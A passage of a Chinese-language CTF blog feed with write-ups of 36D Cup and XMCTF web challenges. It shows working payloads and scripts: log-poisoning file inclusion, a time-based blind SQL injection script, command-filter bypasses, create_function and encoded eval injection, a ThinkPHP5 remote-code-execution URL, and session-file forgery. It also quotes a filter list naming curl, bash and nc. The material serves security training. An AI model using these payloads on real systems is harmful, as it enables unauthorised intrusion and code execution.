class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">visit all_info_u_want.php and you will get all information you want</span><br><span class="line">&#x3D; &#x3D;Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;give you all information you want</span><br><span class="line">if (isset($_GET[&#39;all_info_i_want&#39;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    $file &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot; . $_GET[&#39;file&#39;];</span><br><span class="line">    &#x2F;&#x2F;really baby include</span><br><span class="line">    include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">really really really baby challenge right?</span><br></pre></td></tr></table></figure><p>http回包header得知是nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line">&#x2F;&#x2F;在user-agent处写入一句话木马即可包含RCE</span><br></pre></td></tr></table></figure><h4 id="0X05：WEB-Login-Only-For-36D"><a href="#0X05：WEB-Login-Only-For-36D" class="headerlink" title="0X05：WEB_Login_Only_For_36D"></a>0X05：WEB_Login_Only_For_36D</h4><p>打开是个注入题，常规手段fuzz一下，发现过滤了一下东西</p><ul><li>单引号</li><li>select substr等很多关键字</li><li>= &gt; &lt;</li><li>空格 – ; |等符号</li></ul><p>发现源码有提示</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- if (!preg_match('/admin/', $uname)) die; --&gt;</span><br><span class="line">&lt;!-- select * from 36d_user where username='$uname' and password='$passwd'; --&gt;</span><br></pre></td></tr></table></figure><p>用<code>admin\</code>把单引号注释掉让后面<code>$passwd</code>逃逸出去</p><p>布尔盲注无回显，用时间盲注，上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += hex(ord(i))</span><br><span class="line"></span><br><span class="line">    result = result.replace(<span class="string">'0x'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + result</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">"https://dc695489-cf68-45f2-97f9-1a21f62ba9e3.chall.ctf.show/"</span></span><br><span class="line">string = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'IABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        password = ord2hex(res + chr(j))</span><br><span class="line">        password = <span class="string">'or/**/if((password/**/REGEXP/**/binary/**/&#123;&#125;),sleep(10),1)#'</span>.format(password)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">"admin\\"</span>,</span><br><span class="line">            <span class="string">'password'</span>: password</span><br><span class="line">        &#125;</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        r = req.post(url=url, data=data)</span><br><span class="line">        endtime = time.time()</span><br><span class="line">        <span class="keyword">if</span> endtime - startTime &gt; <span class="number">5</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>跑出来密码是ILoVeThlrtySixD，跑了好几次才跑出来正确的</p><h4 id="0X06-WUSTCTF-朴实无华Revenge"><a href="#0X06-WUSTCTF-朴实无华Revenge" class="headerlink" title="0X06:WUSTCTF__朴实无华Revenge"></a>0X06:WUSTCTF__朴实无华Revenge</h4><p>题目直接给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=<span class="number">1</span>;</span><br><span class="line">    $k=intval($len/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$k;$j++)</span><br><span class="line">        <span class="keyword">if</span> (substr($str,$j,<span class="number">1</span>)!=substr($str,$len-$j<span class="number">-1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            $l=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> ($l==<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[^0-9.]/'</span>, $num)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"非洲欢迎你1"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (preg_match_all(<span class="string">"/\./"</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">"/\-/"</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">"/\-/"</span>, $num)==<span class="number">1</span> &amp;&amp; !preg_match(<span class="string">'/^[-]/'</span>, $num))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"没有这样的数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($numPositve &lt;= <span class="number">-999999999999999999</span> || $numPositve &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"非洲欢迎你2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($md5==md5(md5($md5)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"more"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tail"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"less"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"head"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tac"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"sort"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"$"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"curl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"bash"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nc"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"php"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/['\*\"[?]/"</span>, $get_flag)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'非预期修复*2'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"快到非洲了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//传整数，但是正则过滤了.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line"> <span class="comment">//判断是回文串又不是回文串</span></span><br><span class="line">    </span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line"><span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//根据Ying师傅博客写的这里用浮点数精度的问题就可以绕过</span></span><br><span class="line">payload:num=<span class="number">1000000000000000.00000000000000010</span></span><br></pre></td></tr></table></figure><p>第二层</p><p>MD5硬碰</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mport hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>**<span class="number">33</span>):</span><br><span class="line">    i = str(i)</span><br><span class="line">    num = <span class="string">'0e'</span> + i</span><br><span class="line">    md5 = hashlib.md5(num.encode()).hexdigest()</span><br><span class="line">    md5 = hashlib.md5(md5.encode()).hexdigest()</span><br><span class="line">    <span class="comment"># print(md5)</span></span><br><span class="line">    <span class="keyword">if</span> md5[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'0e'</span> <span class="keyword">and</span> md5[<span class="number">2</span>:].isdigit():</span><br><span class="line">        print(<span class="string">'success str:&#123;&#125;  md5(str):&#123;&#125;'</span>.format(num, md5))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> int(i) % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">         print(i)</span><br><span class="line">//结果：<span class="number">0e1138100474</span></span><br></pre></td></tr></table></figure><p>第三层</p><p>ban了很多命令，这里可以用\斜杠来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_flag=ca\t&lt;flag.ph\p</span><br></pre></td></tr></table></figure><p>所以payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t&lt;flag.ph\p</span><br></pre></td></tr></table></figure><p>在网页源码处找到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;36D杯&quot;&gt;&lt;a href=&quot;#36D杯&quot; class=&quot;headerlink&quot; title=&quot;36D杯&quot;&gt;&lt;/a&gt;36D杯&lt;/h1&gt;
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>XMCTF</title>
    <link href="http://yoursite.com/2020/04/29/XMCTF/"/>
    <id>http://yoursite.com/2020/04/29/XMCTF/</id>
    <published>2020-04-29T07:25:44.000Z</published>
    <updated>2020-05-08T10:01:46.710Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-EASY-WEB1"><a href="#0x01-EASY-WEB1" class="headerlink" title="0x01:EASY_WEB1"></a>0x01:EASY_WEB1</h3><a id="more"></a><p>直接给了源码，审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key = <span class="string">"bad"</span>;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key === <span class="string">'bad'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'badbad!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$act = @$_GET[<span class="string">'act'</span>];</span><br><span class="line">$arg = @$_GET[<span class="string">'arg'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,$act)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'check'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $act($arg,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'666'</span>;</span><br><span class="line">badbad!!!</span><br></pre></td></tr></table></figure><p>变量覆盖,extract($_POST)打开了全局变量POST，可以用post的值来覆盖key绕过第一个条件，后面的正则匹配通过查资料发现是一个创建函数</p><p>payload:?act=\create_function&amp;arg=){}var_dump(scandir(‘../‘));//</p><p>相当于是function xxx(arg){}=function(){var_dump(scandir(‘../‘));}//){},后面的两个斜杠注释了后面的内容，这样函数就完整了</p><img src="/2020/04/29/XMCTF/1.png" class="" title="examplename"><p>可以看到有”ffflll4g”文件，读取文件就可以了</p><h4 id="0X02：WEB7"><a href="#0X02：WEB7" class="headerlink" title="0X02：WEB7"></a>0X02：WEB7</h4><p>打开地址，源码给了，审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//大小写字母和数字都被过滤了，考虑用编码进行绕过，之前碰到过用取反再url编码可以绕过</span></span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//通过传一个中间变量$_,在通过$_()调用getFlag()方法读取，这里相当于是code=$_=getFlag;getFlag();</span></span><br></pre></td></tr></table></figure><p>payload：?code=$<em>=~%98%9A%8B%B9%93%9E%98;$</em>();相当于是code=$_=getFlag;getFlag();</p><h4 id="0X03-WEB4"><a href="#0X03-WEB4" class="headerlink" title="0X03:WEB4"></a>0X03:WEB4</h4><p>打开题目给了一串key：e086aa137fa19f67d27b39d0eca18610，MD5解密一下，是一串ip地址，1.1.1.1,用burp抓包伪造ip</p><img src="/2020/04/29/XMCTF/2.png" class="" title="examplename"><p>访问dhudndrgrhs.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$disable_fun = [<span class="string">"assert"</span>,<span class="string">"print_r"</span>,<span class="string">"system"</span>, <span class="string">"shell_exec"</span>,<span class="string">"ini_set"</span>, <span class="string">"scandir"</span>, <span class="string">"exec"</span>,<span class="string">"proc_open"</span>, <span class="string">"error_log"</span>, <span class="string">"ini_alter"</span>, <span class="string">"ini_set"</span>, <span class="string">"pfsockopen"</span>, <span class="string">"readfile"</span>, <span class="string">"echo"</span>, <span class="string">"file_get_contents"</span>, <span class="string">"readlink"</span>, <span class="string">"symlink"</span>, <span class="string">"popen"</span>, <span class="string">"fopen"</span>, <span class="string">"file"</span>, <span class="string">"fpassthru"</span>];</span><br><span class="line">$disable_fun = array_merge($disable_fun, get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($disable_fun <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[shell], $i)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'xmctf'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[shell]); </span><br><span class="line"><span class="comment">//几乎所有的远程命令执行漏洞都被ban了，这里可以利用php的字符串拼接，拼接命令来绕过正则</span></span><br><span class="line">payload=$a=<span class="string">'sys'</span>.<span class="string">'tem'</span>;$a(<span class="string">'cat flag.php'</span>);</span><br><span class="line">可以看到flag.php文件，读取，在网页源码处发现flag</span><br></pre></td></tr></table></figure><h4 id="0X04-WEB10"><a href="#0X04-WEB10" class="headerlink" title="0X04:WEB10"></a>0X04:WEB10</h4><img src="/2020/04/29/XMCTF/3.png" class="" title="examplename"><p>可以看到提示是thinkphp5版本，直接上payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php？s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo();</span><br></pre></td></tr></table></figure><img src="/2020/04/29/XMCTF/4.png" class="" title="examplename"><p>成功回显phpinfo页面，下面就可以爆目录文件了</p><img src="/2020/04/29/XMCTF/5.png" class="" title="examplename"><p>在根目录下找到了flag文件，直接读取 system(“cat /flag”)即可</p><h4 id="0X05-webEASYSESSION"><a href="#0X05-webEASYSESSION" class="headerlink" title="0X05:webEASYSESSION"></a>0X05:webEASYSESSION</h4><p>给了源码，审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$content = @$_GET[<span class="string">'content'</span>] ? <span class="string">"---mylocalnote---\n"</span> . $_GET[<span class="string">'content'</span>] : <span class="string">""</span>;</span><br><span class="line">$name = @$_GET[<span class="string">'name'</span>] ? $_GET[<span class="string">'name'</span>] : <span class="string">''</span>;</span><br><span class="line">str_replace(<span class="string">'/'</span>, <span class="string">''</span>, $name);</span><br><span class="line">str_replace(<span class="string">'\\'</span>, <span class="string">''</span>, $name);</span><br><span class="line">file_put_contents(<span class="string">"/tmp/"</span> . $name, $content);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Thank u,&#123;$_SESSION['username']&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br></pre></td></tr></table></figure><p>下面是有关session的知识点找到东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session反序列化</span><br><span class="line">PHP使用文件存储Session信息。因此如果我们把Session文件替换了，写入admin信息，那么Flag就会出来了。PHP的Session文件以”sess_”开头，后接Session ID，Session ID仅有[A-Za-z0-9-0]构成。Ubuntu默认安装的PHP中session.serialize_handler默认设置为php。这种情况下，Session文件的内容为(属性名)|(序列化数据)。在访问Session数据的时候，PHP会自动反序列化相应数据。那么，我们构造Note的标题名为”|N;admin|b:1;”。这样反序列化的结果就是admin&#x3D;&#x3D;bool(true)。我们就伪造了admin身份。而我们访问的时候，通过传递Cookie的值PHPSESSID为我们想要的Session ID，PHP就会去反序列化相应的Session文件。</span><br></pre></td></tr></table></figure><p>payload:?content=|N;username|s:5:%22admin%22;&amp;name=sess_p4c8k2sf8gkv0bb9j8uu6r7d99</p><p>成功写入名为username=admin的sessionID<br>再访问flag.php，传上cookie即可</p><h4 id="0X06禁止套娃"><a href="#0X06禁止套娃" class="headerlink" title="0X06禁止套娃"></a>0X06禁止套娃</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 